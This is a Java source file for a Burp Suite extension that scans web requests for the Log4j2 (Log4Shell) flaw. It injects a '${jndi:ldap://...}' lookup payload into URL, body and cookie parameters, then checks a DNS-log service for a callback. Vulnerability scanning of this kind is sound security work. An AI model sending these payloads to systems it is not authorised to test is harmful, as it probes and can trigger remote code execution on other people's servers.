package burp.scanner;

import burp.*;
import burp.dnslog.IDnslog;
import burp.dnslog.platform.LogXn;
import burp.utils.Utils;
import com.alibaba.fastjson.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class Log4j2Scanner implements IScannerCheck {
    private BurpExtender parent;
    private IExtensionHelpers helper;
    private IDnslog dnslog = new LogXn();


    public Log4j2Scanner(final BurpExtender newParent) {
        this.parent = newParent;
        this.helper = newParent.helpers;
    }
    public String urlencodeForTomcat(String exp) {
        exp = exp.replace("{", "%7b");
        exp = exp.replace("}", "%7d");
        return exp;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        IRequestInfo req = this.parent.helpers.analyzeRequest(baseRequestResponse);
        List<IScanIssue> issues = new ArrayList<>();
        byte[] rawRequest = baseRequestResponse.getRequest();
        int UrlParam = 0;
        int CookieParam = 0;
        int BodyParam = 0;
        outer:
        for (IParameter param :
                req.getParameters()) {
            try {
                String tmpDomain = dnslog.getNewDomain();
                JSONObject cc = dnslog.getPassms();
                byte[] tmpRawRequest = rawRequest;
                String exp = "${jndi:ldap://" + tmpDomain + "/" + Utils.GetRandomNumber(100000, 999999) + "}";
                boolean hasModify = false;
                exp = helper.urlEncode(exp);
                exp = urlencodeForTomcat(exp);
                IParameter newParam = parent.helpers.buildParameter(param.getName(), exp, param.getType());
                if(UrlParam + CookieParam + BodyParam == 4){
                    break outer;
                }
                switch (param.getType()) {
                    case IParameter.PARAM_URL:
                        if(UrlParam == 1){
                            continue outer;
                        }
                        UrlParam++;
                        tmpRawRequest = parent.helpers.updateParameter(rawRequest, newParam);
                        hasModify = true;
                        break;
                    case IParameter.PARAM_BODY:
                        if(BodyParam == 2){
                            continue outer;
                        }
                        BodyParam++;
                        exp = helper.urlEncode(exp);
                        exp = urlencodeForTomcat(exp);
                        tmpRawRequest = parent.helpers.updateParameter(rawRequest, newParam);
                        hasModify = true;
                        break;
                    case IParameter.PARAM_COOKIE:
                        if(CookieParam == 1){
                            continue outer;
                        }
                        CookieParam++;
                        exp = helper.urlEncode(exp);
                        exp = urlencodeForTomcat(exp);
                        tmpRawRequest = parent.helpers.updateParameter(rawRequest, newParam);
                        hasModify = true;
                        break;
                    case IParameter.PARAM_JSON:
                    case IParameter.PARAM_XML:
                    case IParameter.PARAM_MULTIPART_ATTR:
                    case IParameter.PARAM_XML_ATTR:
                        //unsupported.
                }
                if (hasModify) {
                    IHttpRequestResponse tmpReq = parent.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), tmpRawRequest);
                    tmpReq.getResponse();
                    boolean hasIssue = dnslog.CheckResult(cc);
                    if (hasIssue) {
                        issues.add(new Log4j2Issue(baseRequestResponse.getHttpService(),
                                req.getUrl(),
                                new IHttpRequestResponse[]{baseRequestResponse, tmpReq},
                                "Log4j2 RCE Detected",
                                String.format("Vulnerable param is \"%s\" in %s.", param.getName(), getTypeName(param.getType())),
                                "High"));
                    }
                }
            } catch (Exception ex) {
                System.out.println(ex);
            }
        }
        return issues;
    }

    private String getTypeName(int typeId) {
        switch (typeId) {
            case IParameter.PARAM_URL:
                return "URL";
            case IParameter.PARAM_BODY:
                return "Body";
            case IParameter.PARAM_COOKIE:
                return "Cookie";
            case IParameter.PARAM_JSON:
                return "Body-json";
            case IParameter.PARAM_XML:
                return "Body-xml";
            case IParameter.PARAM_MULTIPART_ATTR:
                return "Body-multipart";
            case IParameter.PARAM_XML_ATTR:
                return "Body-xml-attr";
            default:
                return "unknown";
        }
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }
}
